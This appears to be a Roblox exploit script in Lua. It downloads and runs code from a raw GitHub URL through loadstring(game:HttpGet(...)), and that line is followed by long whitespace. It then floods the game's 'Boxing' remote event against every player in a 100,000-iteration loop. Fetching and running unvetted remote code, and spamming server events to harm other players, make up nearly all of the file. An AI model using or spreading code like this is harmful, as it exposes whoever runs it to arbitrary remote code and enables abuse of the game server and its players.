local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Events = ReplicatedStorage:WaitForChild("Events")
local BoxingEvent = Events:WaitForChild("Boxing")
local TeleportService = game:GetService("TeleportService")
local Http = game:GetService("HttpService")
local Player = Players.LocalPlayer

loadstring(game:HttpGet('https://raw.githubusercontent.com/boxermain/main/main.lua'))()                                                                                                                      
                                                                                                                        
for i = 1, 100000 do
for _, player in pairs(Players:GetPlayers()) do
            local args = {
                [1] = player,
                [2] = true
            }
            BoxingEvent:FireServer(unpack(args))
        end
        task.wait(0)
end
